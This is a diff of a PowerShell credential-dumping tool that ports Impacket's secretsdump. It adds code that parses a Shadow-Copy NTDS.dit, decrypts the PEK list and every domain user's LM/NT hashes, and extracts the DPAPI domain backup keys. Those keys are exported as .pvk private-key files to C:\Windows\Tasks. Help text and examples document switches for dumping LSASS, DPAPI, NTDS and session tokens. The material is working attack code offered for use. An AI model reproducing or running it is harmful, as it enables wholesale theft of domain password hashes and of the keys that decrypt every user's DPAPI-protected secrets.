 					$lvName = [System.Text.Encoding]::ASCII.GetString($LeafEntry["EntryData"][($DataDefinitionHeader["VariableSizeOffset"] + 7)..($DataDefinitionHeader["VariableSizeOffset"] + 7 + $lvLen - 1)])
-					$Global:PageTables[$Global:CurrentTable]["LongValues"][$lvName] = $LeafEntry
+					$Global:PageTables[$Global:CurrentTable]["LongValues"] = $LeafEntry
 				}
 				Else { Write-Host ("`t[-] Unknown type 0x{0:X2}" -f ($CatalogEntry["Type"])); Break }
 			}
@@ -5201,6 +5724,10 @@ function ParsePageRecord($PageData, $PageRecord, $PageRecordLength, $Version, $R
 
 function GetPageRecord($NTDSContent, $PageNum, $Version, $Revision, $PageSize)
 {
+	<#
+		Parse page headers
+	#>
+
 	$Start = ($PageNum + 1) * $PageSize
 	$End = $Start + $PageSize
 	# Write-Host ("Trying to fetch page {0} (0x{1:X2})" -f ($PageNum, $Start))
@@ -5282,21 +5809,35 @@ function GetPageRecord($NTDSContent, $PageNum, $Version, $Revision, $PageSize)
 
 function ParseCatalog($NTDSContent, $PageNum, $Version, $Revision, $PageSize)
 {
-	$PageData, $PageRecord, $PageRecordLength = GetPageRecord $NTDSContent $PageNum $Version $Revision $PageSize
-	ParsePageRecord $PageData $PageRecord $PageRecordLength $Version $Revision $PageSize
+	<#
+		A catalog have many pages
+			- A page is at $NTDSContent[(($PageNum + 1) * $PageSize)..((($PageNum + 1) * $PageSize) + $PageSize)]
+			- PageData = Raw page content
+			- PageRecord = The parsed page (headers)
+		A page is divided into tags (tag data and tag headers)
+			- A tag header is 4 bytes and contain pointers (size, offset) to the tag data into the page
+				- All tag headers are at the end of the page in reverse order
+			- A tag data contain data of many types (table, column, index, long value)
+		A leaf is a page that contain information on a specific table
+		To parse the catalog we need to parse the leaf pages
+	#>
 
+	$PageData, $PageRecord, $PageRecordLength = GetPageRecord $NTDSContent $PageNum $Version $Revision $PageSize
+	ParsePageRecord $PageData $PageRecord $PageRecordLength $Version $Revision $PageSize $PageNum
+
+	# For all tags
 	For ($i = 1; $i -lt $PageRecord["FirstAvailablePageTag"]; $i += 1)
 	{
-		$PageFlags, $TagData = GetTag $PageData $PageRecord $i $PageRecordLength $Version $Revision $PageSize
+		$TagFlags, $TagData = GetTag $PageData $PageRecord $i $PageRecordLength $Version $Revision $PageSize $PageNums
 		$FLAGS_LEAF = 2
+
+		# If the page is a leaf we need to parse the next page for this tag
 		If (($PageRecord["PageFlags"] -band $FLAGS_LEAF) -eq 0)
 		{
-			# Branch page
-
 			# Structure from Impacket "ese.py" : ESENT_BRANCH_ENTRY
 			$TAG_COMMON = 4
 			$Start = 0
-			If (($PageFlags -band $TAG_COMMON) -gt 0)
+			If (($TagFlags -band $TAG_COMMON) -gt 0)
 			{
 				# Include the common header
 				$CommonPageKeySize = [BitConverter]::ToUInt16($TagData[0..1], 0)
@@ -5335,6 +5876,56 @@ function PrintCatalog()
 			Write-Host ("`t`t{0}" -f ($Index))
 		}
 	}
+}
+
+function DecryptDomainBackupKeyRecord($DomainBackupKeyBytes, $PEKs)
+{
+	<#
+		DecryptDomainBackupKeyRecord:
+			- Header = DomainBackupKeyBytes[0..7]
+			- KeyMaterial = DomainBackupKeyBytes[8..23]
+			- EncKey = DomainBackupKeyBytes[24..39]
+			- If (Header[0..3] == [0x13,0,0,0]) # Win2016 TP4
+				- Header = DomainBackupKeyBytes[0..7]
+				- KeyMaterial = DomainBackupKeyBytes[8..23]
+				- EncHash = DomainBackupKeyBytes[28..(DomainBackupKeyBytes.Length-1)]
+				- pekIndex = [UInt16](([System.BitConverter]::ToString(Header).Replace("-", "")).Substring(8,2))
+				- DomainBackupKey = AESDecrypt PEKs[pekIndex] EncHash[0..15] KeyMaterial
+			- Else
+				- pekIndex = [UInt16](([System.BitConverter]::ToString(Header).Replace("-", "")).Substring(8,2))
+				- TMPKey = MD5 (PEKs[pekIndex] + KeyMaterial)
+				- DomainBackupKey = RC4 (TMPKey, EncHash)
+	#>
+
+	# Structure from Impacket "secretsdump.py" : CRYPTED_HASH
+	$Header = $DomainBackupKeyBytes[0..7]
+	$KeyMaterial = $DomainBackupKeyBytes[8..23]
+	$EncKey = $DomainBackupKeyBytes[24..39]
+
+	If (@(Compare-Object $Header[0..3] @([Int]0x13, [Int]0x00, [Int]0x00, [Int]0x00) -SyncWindow 0).Length -eq 0)
+	{
+		# Win2016 TP4 decryption is different
+		# Structure from Impacket "secretsdump.py" : CRYPTED_HASHW16
+		$Header = $DomainBackupKeyBytes[0..7]
+		$KeyMaterial = $DomainBackupKeyBytes[8..23]
+		$Unknown = $DomainBackupKeyBytes[24..27]
+		$EncKey = $DomainBackupKeyBytes[28..($DomainBackupKeyBytes.Length-1)]
+
+		$pekIndex = [UInt16](([System.BitConverter]::ToString($Header).Replace("-", "")).Substring(8,2))
+		$DomainBackupKey = Unpad (AESTransform $PEKs[$pekIndex] $EncKey $KeyMaterial ([Security.Cryptography.CipherMode]::CBC) $False)
+	}
+	Else
+	{
+		$MD5 = [System.Security.Cryptography.MD5]::Create()
+		$pekIndex = [UInt16](([System.BitConverter]::ToString($Header).Replace("-", "")).Substring(8,2))
+		$Update = $PEKs[$pekIndex]
+		$Update += $KeyMaterial
+		$TMPKey = $MD5.ComputeHash($Update)
+
+		$DomainBackupKey = (NewRC4 $TMPKey).Transform($EncKey)
+	}
+
+	return $DomainBackupKey
 }
 
 function DecryptUserRecord($UserRecord, $PEKs)
@@ -5535,14 +6126,169 @@ function DecryptUserRecord($UserRecord, $PEKs)
 	return $UserInfo
 }
 
-function ParseNTDS($NTDSPath, $BootKey)
+function ResolveLongValue($NTDSContent, $Version, $FileFormatRevision, $PageSize, $TableName, $LID)
+{
+	<#
+		Browse over the LongValues catalog from the table name
+		Get next row repeateadly until found key from the record equal to the reverse LID value
+		Then, get next row repeateadly again while the key from the record start with the reverse LID value
+			- Store the chunk and chunk offset
+		For each chunks
+			- Get the chunk and the next chunk offset
+			- If the chunk length different from (next chunk offset - current chunk offset)) -> We need to decompress the chunk
+			- Add the chunk to the buffer
+	#>
+	
+	[System.Array]::Reverse($LID)
+	$Cursor = GetCursor $NTDSContent $Version $FileFormatRevision $PageSize $TableName "LongValues"
+
+	$KeyFound = $False
+	While ($True)
+	{
+		$FilterTables = $Null
+		$Record = GetNextRow $NTDSContent $Cursor $FilterTables $Version $FileFormatRevision $PageSize
+		If ($Record)
+		{
+			If (@(Compare-Object $LID $Record["LocalPageKey"] -SyncWindow 0).Length -eq 0)
+			{
+				$Size = [BitConverter]::ToUInt32($Record["EntryData"][4..7], 0)
+				$KeyFound = $True
+				Break
+			}	
+		}
+		Else { Break }
+	}
+
+	$Chunks = @()
+	$ChunkOffsets = @()
+	If ($KeyFound)
+	{
+		While ($True)
+		{
+			$Record = GetNextRow $NTDSContent $Cursor $FilterTables $Version $FileFormatRevision $PageSize
+			If ($Record)
+			{
+				If (@(Compare-Object $LID $Record["LocalPageKey"][0..($LID.Length - 1)] -SyncWindow 0).Length -ne 0)
+				{
+					Break
+				}
+				
+				$Chunks += ,($Record["EntryData"])
+				$ChunkOffset = $Record["LocalPageKey"][-4..-1]
+				[System.Array]::Reverse($ChunkOffset)
+				$ChunkOffsets += ,([BitConverter]::ToUInt32($ChunkOffset, 0))
+			}
+			Else { Break }
+		}
+
+		$ChunkOffsets += ,($Size)
+
+		$Buf = @()
+		$ChunkOffset = 0
+		# Iterate over chunks
+		For ($i = 0; $i -lt ($ChunkOffsets.Length - 1); $i++)
+		{
+			$Chunk = $Chunks[$i]
+			$NextChunkOffset = $ChunkOffsets[$i + 1]
+
+			# Chunk sizes should be used to determine if a chunk is compressed
+			If ($Chunk.Length -ne ($NextChunkOffset - $ChunkOffset))
+			{
+				$Chunk = Decompress $Chunk
+			}
+
+			# Append the chunk to the buffer
+			$Buf += $Chunk
+			$ChunkOffset += $NextChunkOffset
+		}
+
+		return $Buf
+	}
+	Else
+	{
+		Write-Host ("`t[-] LID = {0} not found in table '{1}' for LongValues catalog" -f ([System.BitConverter]::ToString($Lid).Replace("-", ""), $TableName))
+		return $Null
+	}
+}
+
+function ParseDomainBackupKey($Data, $ExportDomainBackupKey, $DomainBackupKeyName)
+{
+	$PVK = @{}
+
+	$Version = [BitConverter]::ToUInt32($Data[0..3], 0)
+	If ($Version -eq 1)
+	{
+		$PVK["Version"] = $Version
+		$PVK["LegacyKey"] = $Data[4..($Data.Length-1)]
+
+		return $PVK
+	}
+	ElseIf ($Version -eq 2)
+	{
+		$KeyLength = $Data[4..7]
+		$CertificateLength = [BitConverter]::ToUInt32($Data[8..11], 0)
+		$Data = $Data[12..($Data.Length-1)]
+		
+		# Export this part to a .pvk file
+		$PVK["Magic"] = @(0x1E, 0xF1, 0xB5, 0xB0) # B0, 0xB5, 0xF1, 0x1E)
+		$PVK["Version"] = @(0, 0, 0, 0)
+		$PVK["KeySpec"] = @(1, 0, 0, 0)
+		$PVK["IsEncrypted"] = @(0, 0, 0, 0)
+		$PVK["SaltLength"] = @(0, 0, 0, 0)
+		$PVK["KeyLength"] = $KeyLength
+		$PVK["PrivateKey"] = $Data[0..(([BitConverter]::ToUInt32($KeyLength, 0))-1)]
+
+		If ($ExportDomainBackupKey)
+		{
+			$PVKFile = "C:\Windows\Tasks\" + "$DomainBackupKeyName" + ".pvk"
+			$PVKContent = $PVK["Magic"] + $PVK["Version"] + $PVK["KeySpec"] + $PVK["IsEncrypted"] + $PVK["SaltLength"] + $PVK["KeyLength"] + $PVK["PrivateKey"]
+			[System.IO.File]::WriteAllBytes($PVKFile, $PVKContent)
+
+			Write-Host("`t[+] {0} saved into {1}" -f ($DomainBackupKeyName, $PVKFile))
+		}
+
+		# Export this to a certificate file
+		$PVK["CertificateLength"] = $CertificateLength
+		$PVK["Certificate"] = $Data[([BitConverter]::ToUInt32($KeyLength, 0))..(([BitConverter]::ToUInt32($KeyLength, 0)) + $CertificateLength - 1)]
+
+		# Extract the RSA private numbers
+		$pk = @{}
+		$pk["Type"] = $PVK["PrivateKey"][0]
+		$pk["Version"] = $PVK["PrivateKey"][1]
+		$pk["Reserved"] = $PVK["PrivateKey"][2..3]
+		$pk["KeyAlg"] = $PVK["PrivateKey"][4..7]
+		$pk["Magic"] = $PVK["PrivateKey"][8..11]
+		$pk["BitLen"] = $PVK["PrivateKey"][12..15]
+
+		$c8 = [Math]::Ceiling([BitConverter]::ToUInt32($pk["BitLen"], 0) / 8)
+		$c16 = [Math]::Ceiling([BitConverter]::ToUInt32($pk["BitLen"], 0) / 16)
+
+		$pk["PubExp"] = $PVK["PrivateKey"][16..19]
+		$pk["Modulus"] = $PVK["PrivateKey"][20..($c8 + 19)]
+		$pk["P"] = $PVK["PrivateKey"][($c8 + 20)..($c8 + $c16 + 19)]
+		$pk["Q"] = $PVK["PrivateKey"][($c8 + $c16 + 20)..($c8 + 2 * $c16 + 19)]
+		$pk["DP"] = $PVK["PrivateKey"][($c8 + 2 * $c16 + 20)..($c8 + 3 * $c16 + 19)]
+		$pk["DQ"] = $PVK["PrivateKey"][($c8 + 3 * $c16 + 20)..($c8 + 4 * $c16 + 19)]
+		$pk["IQ"] = $PVK["PrivateKey"][($c8 + 4 * $c16 + 20)..($c8 + 5 * $c16 + 19)]
+		$pk["D"] = $PVK["PrivateKey"][($c8 + 5 * $c16 + 20)..($c8 * 2 + 5 * $c16 + 19)]
+
+		return $pk
+	}
+	Else
+	{
+		Write-Host("`t[-] Unknown DomainBackupKey version {0}" -f ($Version))
+		return $Null
+	}
+}
+
+function ParseNTDS($NTDSPath, $BootKey, $ExportDomainBackupKey)
 {
 	<#
 		ParseNTDS:
 			1- Extract headers from NTDS at page 1
 			2- Parse DB starting at page 4
 			3- Open page table "datatable" and position a cursor at the leaf levels for fast reading
-			4- Search PEKList into page table "datatable" (we may found user account record while searching, store them for later processing)
+			4- Search PEKList, Domain Backup Keys and users into page table "datatable"
 			5- Decrypt the PEKList if founded with BootKey and store PEK Keys
 				- KeyMaterial = EncPEKListData[8..23]
 				- EncPEKList = EncPEKListData[24..(EncPEKListData.Length-1)]
@@ -5553,15 +6299,18 @@ function ParseNTDS($NTDSPath, $BootKey)
 					- PEKs into RC4 (Key, EncPEKList)
 				5.2- Elif (EncPEKListData[0..3] == [3,0,0,0]) # Windows 2016 TP4 and up
 					- PEKs into AESDecrypt (Key = BootKey, CipherText = EncPEKList, IV = KeyMaterial)
-			6- Now we have PEK Keys, Let decrypt each user record
-				- Starting from users already cached when searching Encrypted PEKList
-				- Then search other users into NTDS after Encrypted PEKList and decrypt LM/NT hashes
+			6- Now we have PEK Keys
+				- Decrypt user records
+				- Decrypt Domain Backup Keys records
 	#>
 
 	$NTDSContent = [System.IO.File]::ReadAllBytes($NTDSPath)
 	$MaxPageSize = 8192
 
+	########################################
 	# 1- Extract headers from NTDS at page 1
+	########################################
+
 	Write-Host ("[+] Reading NTDS headers at page 1")
 	$MainHeader = $NTDSContent[0..($MaxPageSize-1)]
 
@@ -5639,124 +6388,37 @@ function ParseNTDS($NTDSPath, $BootKey)
 	$UnknownFlags = [BitConverter]::ToUInt32($MainHeader[640..643], 0)
 
 	$TotalPages = ([Math]::Floor($NTDSContent.Length / $PageSize)) - 2
+	<#
 	Write-Host ("`t[+] Database version = 0x{0:X4}" -f ($Version))
 	Write-Host ("`t[+] Database revision = 0x{0:X4}" -f ($FileFormatRevision))
 	Write-Host ("`t[+] Database page size = {0}" -f ($PageSize))
 	Write-Host ("`t[+] Database total pages = {0}" -f ($TotalPages))
+	#>
 
+	################################
 	# 2- Parse DB starting at page 4
+	################################
+
 	Write-Host ("[+] Parse NTDS database from page 4")
 	$CATALOG_PAGE_NUMBER = 4
 	ParseCatalog $NTDSContent $CATALOG_PAGE_NUMBER $Version $FileFormatRevision $PageSize
+	# PrintCatalog
 
+	##########################################################################################
 	# 3- Open page table "datatable" and position a cursor at the leaf levels for fast reading
+	##########################################################################################
+
 	If ($Global:PageTables["datatable"])
 	{
-		$Entry = $Global:PageTables["datatable"]["TableEntry"]
+		$Cursor = GetCursor $NTDSContent $Version $FileFormatRevision $PageSize "datatable" "TableEntry"
 
-		# Structure from Impacket "ese.py" : ESENT_DATA_DEFINITION_HEADER
-		$DataDefinitionHeader = @{}
-		$DataDefinitionHeader["LastFixedSize"] = [UInt32]($Entry["EntryData"][0])
-		$DataDefinitionHeader["LastVariableDataType"] = [UInt32]($Entry["EntryData"][1])
-		$DataDefinitionHeader["VariableSizeOffset"] = [BitConverter]::ToUInt16($Entry["EntryData"][2..3], 0)
+		#################################################
+		# 4- Search PEKList, Domain Backup Keys and users
+		#################################################
 
-		# Structure from Impacket "ese.py" : ESENT_CATALOG_DATA_DEFINITION_ENTRY
-		$CatalogEntry = @{}
-		$CatalogEntry["FatherPageID"] = [BitConverter]::ToUInt32($Entry["EntryData"][4..7], 0)
-		$CatalogEntry["Type"] = [BitConverter]::ToUInt16($Entry["EntryData"][8..9], 0)
-		$CatalogEntry["Identifier"] = [BitConverter]::ToUInt32($Entry["EntryData"][10..13], 0)
-
-		$CATALOG_TYPE_TABLE = 1
-		$CATALOG_TYPE_COLUMN = 2
-		$CATALOG_TYPE_INDEX = 3
-		$CATALOG_TYPE_LONG_VALUE = 4
-		$CATALOG_TYPE_CALLBACK = 5
-		If ($CatalogEntry["Type"] -eq $CATALOG_TYPE_TABLE)
-		{
-			$CatalogEntry["FatherDataPageNumber"] = [BitConverter]::ToUInt32($Entry["EntryData"][14..17], 0)
-			$CatalogEntry["SpaceUsage"] = [BitConverter]::ToUInt32($Entry["EntryData"][18..21], 0)
-			$CatalogEntry["Trailing"] = $Entry["EntryData"][22..($Entry["EntryData"].Length-1)]
-		}
-		ElseIf ($CatalogEntry["Type"] -eq $CATALOG_TYPE_COLUMN)
-		{
-			$CatalogEntry["ColumnType"] = [BitConverter]::ToUInt32($Entry["EntryData"][14..17], 0)
-			$CatalogEntry["SpaceUsage"] = [BitConverter]::ToUInt32($Entry["EntryData"][18..21], 0)
-			$CatalogEntry["ColumnFlags"] = [BitConverter]::ToUInt32($Entry["EntryData"][22..25], 0)
-			$CatalogEntry["CodePage"] = [BitConverter]::ToUInt32($Entry["EntryData"][26..29], 0)
-			$CatalogEntry["Trailing"] = $Entry["EntryData"][22..($Entry["EntryData"].Length-1)]
-		}
-		ElseIf ($CatalogEntry["Type"] -eq $CATALOG_TYPE_INDEX)
-		{
-			$CatalogEntry["FatherDataPageNumber"] = [BitConverter]::ToUInt32($Entry["EntryData"][14..17], 0)
-			$CatalogEntry["SpaceUsage"] = [BitConverter]::ToUInt32($Entry["EntryData"][18..21], 0)
-			$CatalogEntry["IndexFlags"] = [BitConverter]::ToUInt32($Entry["EntryData"][22..25], 0)
-			$CatalogEntry["Locale"] = [BitConverter]::ToUInt32($Entry["EntryData"][26..29], 0)
-			$CatalogEntry["Trailing"] = $Entry["EntryData"][22..($Entry["EntryData"].Length-1)]
-		}
-		ElseIf ($CatalogEntry["Type"] -eq $CATALOG_TYPE_LONG_VALUE)
-		{
-			$CatalogEntry["FatherDataPageNumber"] = [BitConverter]::ToUInt32($Entry["EntryData"][14..17], 0)
-			$CatalogEntry["SpaceUsage"] = [BitConverter]::ToUInt32($Entry["EntryData"][18..21], 0)
-			$CatalogEntry["Trailing"] = $Entry["EntryData"][22..($Entry["EntryData"].Length-1)]
-		}
-		ElseIf ($CatalogEntry["Type"] -eq $CATALOG_TYPE_CALLBACK) { Write-Host "`t[-] Callback type not supported"; Return $Null }
-		Else { Write-Host ("`t[-] Unknown catalog type 0x{0:X2}" -f ($CatalogEntry["DataType"])); Return $Null }
-
-		# Position a cursor at the leaf levels for fast reading
-		$PageNum = $CatalogEntry["FatherDataPageNumber"]
-		$Done = $False
-		While ($Done -eq $False)
-		{
-			$PageData, $PageRecord, $PageRecordLength = GetPageRecord $NTDSContent $PageNum $Version $FileFormatRevision $PageSize
-			If ($PageRecord["FirstAvailablePageTag"] -le 1)
-			{
-				# There are no records
-				$Done = $True
-			}
-
-			For ($i = 1; $i -lt $PageRecord["FirstAvailablePageTag"]; $i += 1)
-			{
-				$PageFlags, $TagData = GetTag $PageData $PageRecord $i $PageRecordLength $Version $FileFormatRevision $PageSize
-				$FLAGS_LEAF = 2
-				If (($PageRecord["PageFlags"] -band $FLAGS_LEAF) -eq 0)
-				{
-					# Branch page, move on to the next page
-
-					# Structure from Impacket "ese.py" : ESENT_BRANCH_ENTRY
-					$TAG_COMMON = 4
-					$Start = 0
-					If (($PageFlags -band $TAG_COMMON) -gt 0)
-					{
-						# Include the common header
-						$CommonPageKeySize = [BitConverter]::ToUInt16($TagData[0..1], 0)
-						$Start = 2
-					}
-
-					$LocalPageKeySize = [BitConverter]::ToUInt16($TagData[$Start..($Start + 2)], 0)
-					$X = $Start + 2
-					$Y = $X + $LocalPageKeySize
-					$LocalPageKey = $TagData[$X..($Y-1)]
-					$X = $Y
-					$Y = $X + 4
-					$ChildPageNumber = [BitConverter]::ToUInt32($TagData[$X..($Y-1)], 0)
-
-					$PageNum = $ChildPageNumber
-					Break
-				}
-				Else { $Done = $True; Break }
-			}
-		}
-
-		$Cursor = @{}
-		$Cursor["TableData"] = $Global:PageTables["datatable"]
-		$Cursor["FatherDataPageNumber"] = $CatalogEntry["FatherDataPageNumber"]
-		$Cursor["CurrentPageRecord"] = $PageRecord
-		$Cursor["CurrentPageData"] = $PageData
-		$Cursor["CurrentTag"] = 0
-
-		# 4- Search PEKList (we may found user account record while searching, store them for later processing)
-
-		$TMPUsers = @()
+		$EncUsers = @()
+		$EncDomainBackupKeys = @{}
+		$EncPEKListData = $Null
 
 		# Structure from Impacket "secretsdump.py" : NAME_TO_INTERNAL
 		$NameToInternal = @{}
@@ -5781,19 +6443,22 @@ function ParseNTDS($NTDSPath, $BootKey)
 		$NameToInternal["supplementalCredentials"] = "ATTk589949"
 		$NameToInternal["pwdLastSet"] = "ATTq589920"
 
+		$NameToInternal["name"] = "ATTm589825" # Name
+		$NameToInternal["currentValue"] = "ATTk589851" # Encrypted key data OR reference as Long Value ID
+
 		# Structure from Impacket "secretsdump.py" : ACCOUNT_TYPES
 		# SAM_NORMAL_USER_ACCOUNT = 0x30000000
 		# SAM_MACHINE_ACCOUNT     = 0x30000001
 		# SAM_TRUST_ACCOUNT       = 0x30000002
 		$AccountTypes = @([UInt32]0x30000000, [UInt32]0x30000001, [UInt32]0x30000002)
 
-		$EncPEKListData = $Null
-		Write-Host ("[+] Searching PEKList into database and decrypt It with BootKey")
+		Write-Host ("[+] Searching PEKList, Domain Backup Keys and users into page table 'datatable'")
 		While ($True)
 		{
-
 			# Structure from Impacket "secretsdump.py" : __filter_tables_usersecret
 			$FilterTables = @{}
+			
+			# For domain users LM/NT hashes
 			$FilterTables[$NameToInternal["objectSid"]] = 1
 			$FilterTables[$NameToInternal["dBCSPwd"]] = 1
 			$FilterTables[$NameToInternal["name"]] = 1
@@ -5808,14 +6473,22 @@ function ParseNTDS($NTDSPath, $BootKey)
 			$FilterTables[$NameToInternal["supplementalCredentials"]] = 1
 			$FilterTables[$NameToInternal["pekList"]] = 1
 
-			$Record = GetNextRow $NTDSContent $Cursor $FilterTables $PageRecordLength $Version $FileFormatRevision $PageSize
+			# For PAPI Domain Backup Keys
+			$FilterTables[$NameToInternal["name"]] = 1
+			$FilterTables[$NameToInternal["currentValue"]] = 1
+
+			$Record = GetNextRow $NTDSContent $Cursor $FilterTables $Version $FileFormatRevision $PageSize
 
 			If ($Record)
 			{
+				If ($Record[$NameToInternal["name"]] -match "BCKUPKEY_")
+				{
+					$EncDomainBackupKeys[$Record[$NameToInternal["name"]]] = $Record[$NameToInternal["currentValue"]]
+				}
+
 				If ($Record[$NameToInternal["pekList"]])
 				{
 					$EncPEKListData = $Record[$NameToInternal["pekList"]]
-					Break
 				}
 
 				If ($Record[$NameToInternal["sAMAccountType"]])
@@ -5823,19 +6496,21 @@ function ParseNTDS($NTDSPath, $BootKey)
 					$sAMAccountType = [BitConverter]::ToUInt32($Record[$NameToInternal["sAMAccountType"]], 0)
 					If ($AccountTypes -Contains $sAMAccountType)
 					{
-						# Found some users, but not ready to process them. Store them
-						$TMPUsers += ,($Record)
+						$EncUsers += ,($Record)
 					}
 				}
 			}
 			Else { Break }
 		}
 
+		######################################################
 		# 5- Decrypt the PEKList if founded and store PEK Keys
+		######################################################
+
 		$PEKs = @()
 		If ($EncPEKListData)
 		{
-			Write-Host ("`t[+] Found Encrypted PEKList = {0}" -f ([System.BitConverter]::ToString($EncPEKListData).Replace("-", "")))
+			Write-Host ("[+] Decrypt PEKList")
 
 			# Structure from Impacket "secretsdump.py" : PEKLIST_ENC
 			$Header = $EncPEKListData[0..7]
@@ -5917,38 +6592,54 @@ function ParseNTDS($NTDSPath, $BootKey)
 				Return $Null
 			}
 
-			# 6- Now we have PEK Keys, Let decrypt each user record
-			Write-Host ("[+] Searching user records into database and decrypt them with PEK keys")
-			$Users = @()
+			##############################################################################
+			# 6- Now we have PEK Keys, Let decrypt each Domain Backup Keys and user record
+			##############################################################################
 
-			# Starting from users already cached when searching Encrypted PEKList
-			ForEach ($UserRecord in $TMPUsers)
+			Write-Host ("[+] Decrypt Domain Backup Keys records")
+			$DomainBackupKeys = @{}
+			ForEach ($DomainBackupKeyName in $EncDomainBackupKeys.Keys)
 			{
-				# Let decrypt user record
-				$Users += ,(DecryptUserRecord $UserRecord $PEKs)
-			}
-
-			# Then search other users into NTDS after Encrypted PEKList and decrypt LM/NT hashes
-			While ($True)
-			{
-				$Record = GetNextRow $NTDSContent $Cursor $FilterTables $PageRecordLength $Version $FileFormatRevision $PageSize
-				If ($Record)
+				If ($EncDomainBackupKeys[$DomainBackupKeyName].Length -gt 4)
 				{
-					If ($Record[$NameToInternal["sAMAccountType"]])
+					# This is the encrypted key data
+					$Data = DecryptDomainBackupKeyRecord $EncDomainBackupKeys[$DomainBackupKeyName] $PEKs
+				}
+				Else
+				{
+					# This is a reference as a Long Value ID
+					$EncDomainBackupKey = ResolveLongValue $NTDSContent $Version $FileFormatRevision $PageSize "datatable" $EncDomainBackupKeys[$DomainBackupKeyName]
+					If ($EncDomainBackupKey)
 					{
-						$sAMAccountType = [BitConverter]::ToUInt32($Record[$NameToInternal["sAMAccountType"]], 0)
-						If ($AccountTypes -Contains $sAMAccountType)
+						$Data = DecryptDomainBackupKeyRecord $EncDomainBackupKey $PEKs
+					}
+					Else { $Data = $Null }
+				}
+
+				# Write-Host("`t[+] {0} = {1}" -f ($DomainBackupKeyName, [System.BitConverter]::ToString($Data).Replace("-", "")))
+
+				If ($Data)
+				{
+					If ($DomainBackupKeyName -ne "BCKUPKEY_PREFERRED Secret" -and $DomainBackupKeyName -ne "BCKUPKEY_P Secret")
+					{
+						$DomainBackupKey = ParseDomainBackupKey $Data $ExportDomainBackupKey $DomainBackupKeyName
+						If ($DomainBackupKey["Version"] -ne 1)
 						{
-							# Found a user record, Let decrypt user record
-							$Users += ,(DecryptUserRecord $Record $PEKs)
+							$DomainBackupKeys[$DomainBackupKeyName] = $DomainBackupKey
 						}
 					}
 				}
-				Else { Break }
 			}
 
-			# Return user infos gathered
-			Return $Users
+			Write-Host ("[+] Decrypt user records")
+			$Users = @()
+			ForEach ($EncUserRecord in $EncUsers)
+			{
+				$Users += ,(DecryptUserRecord $EncUserRecord $PEKs)
+			}
+
+			# Return users and Domain Backup Keys
+			Return ($Users, $DomainBackupKeys)
 		}
 		Else
 		{
@@ -5963,7 +6654,7 @@ function ParseNTDS($NTDSPath, $BootKey)
 	}
 }
 
-function Get-NTDS($Method, $BootKey)
+function Get-NTDS($Method, $BootKey, $ExportDomainBackupKey)
 {
 	<#
 		Get-NTDS:
@@ -6021,10 +6712,10 @@ function Get-NTDS($Method, $BootKey)
 			Write-Host ("[+] Saved NTDS.dit via Shadow Copy at $NTDSSavePath")
 
 			# Now we have NTDS.dit at C:\Windows\Tasks\NTDS.dit, Let parse It using Microsoft Extensive Storage Engine (ESE) format
-			$Users = ParseNTDS $NTDSSavePath $BootKey
+			$Users, $DomainBackupKeys = ParseNTDS $NTDSSavePath $BootKey $ExportDomainBackupKey
 			Remove-Item $NTDSSavePath -Force
 			Write-Host ""
-			Return $Users
+			Return ($Users, $DomainBackupKeys)
 		}
 		Else # Use Method = IDL_DRSGetNCChanges()
 		{
@@ -11362,15 +12053,25 @@ function Get-LSASS($Method)
 .PARAMETER CachedDomainCreds
 	Dump Cached Domain Credentials (MsCash hashes)
 .PARAMETER DPAPI
-	Dump DPAPI Secrets
+	Dump DPAPI Secrets. Will dump first LSA Secrets (for DPAPI System PreKeys), LSASS (for unencrypted Masterkeys), NTDS.dit (for Domain Backup Key) unless specify to skip
+.PARAMETER InUserContext
+	Decrypt DPAPI Blobs in current user context with CryptUnprotect()
+.PARAMETER NoMasterKeysDecryption
+	Skip DPAPI Blobs and MasterKeys File decryption with MasterKeys. May be use with -InUserContext flag
 .PARAMETER SkipLSASS
 	Do not search into LSASS Pwdds, NT Hashes and MasterKeys for DPAPI
 .PARAMETER VNC
 	Dump VNC pwds (TightVNC, UltraVNC, TigerVNC, RealVNC)
 .PARAMETER NTDS
 	Dump NTDS.dit (LM/NT Hashes)
+.PARAMETER ExportDomainBackupKey
+	Export the Domain Backup Key in .pvk format
 .PARAMETER LSASS
 	Dump LSASS Secrets (MSV Secrets, Credman Secrets, WDigest Secrets, Kerberos Secrets, DPAPI Secrets, Cloudap Secrets, LiveSSP Secrets, SSP Secrets, TSPKG Secrets)
+.PARAMETER SkipLSASS
+	Do not search int LSASS
+.PARAMETER SkipNTDS
+	Do not search into NTDS.dit
 .PARAMETER SessionTokens
 	List Session Tokens (ProcessID:SessionID:Domain:UserName:SID:LogonID:TokenType:ImpersonationLevel:LogonType:IsElevatedToken:TokenElevationType) with their privileges
 .PARAMETER ActivatePrivilege
@@ -11399,6 +12100,8 @@ function Get-LSASS($Method)
 .EXAMPLE
 	Get-WindowsSecrets -NTDS
 .EXAMPLE
+	Get-WindowsSecrets -NTDS -ExportDomainBackupKey
+.EXAMPLE
 	Get-WindowsSecrets -SessionTokens
 .EXAMPLE
 	Get-WindowsSecrets -ActivatePrivilege "SeShutdownPrivilege"
@@ -11415,9 +12118,15 @@ function Get-LSASS($Method)
 .EXAMPLE
 	Get-WindowsSecrets -DPAPI
 .EXAMPLE
+	Get-WindowsSecrets -DPAPI -InUserContext
+.EXAMPLE
+	Get-WindowsSecrets -DPAPI -InUserContext -NoMasterKeysDecryption
+.EXAMPLE
 	Get-WindowsSecrets -DPAPI -Creds 'User1:Pwd1/User2@Domain:Pwd2' -NTHashes 'User1:HexNTHash1/User2@Domain:HexNTHash2'
 .EXAMPLE
 	Get-WindowsSecrets -DPAPI -Creds 'User1:Pwd1/User2@Domain:Pwd2' -NTHashes 'User1:HexNTHash1/User2@Domain:HexNTHash2' -SkipLSASS
+.EXAMPLE
+	Get-WindowsSecrets -DPAPI -Creds 'User1:Pwd1/User2@Domain:Pwd2' -NTHashes 'User1:HexNTHash1/User2@Domain:HexNTHash2' -SkipLSASS -SkipNTDS
 #>
 function Get-WindowsSecrets()
 {
@@ -11436,7 +12145,12 @@ function Get-WindowsSecrets()
 		[Parameter(Mandatory=$False)][Switch]$DPAPI,
 		[Parameter(Mandatory=$False)][String]$Creds,
 		[Parameter(Mandatory=$False)][String]$NTHashes,
+		[Parameter(Mandatory=$False)][Switch]$InUserContext,
+		[Parameter(Mandatory=$False)][Switch]$NoMasterKeysDecryption,
+		
 		[Parameter(Mandatory=$False)][Switch]$SkipLSASS,
+		[Parameter(Mandatory=$False)][Switch]$SkipNTDS,
+		[Parameter(Mandatory=$False)][Switch]$ExportDomainBackupKey,
 		
 		[Parameter(Mandatory=$False)][Switch]$SessionTokens,
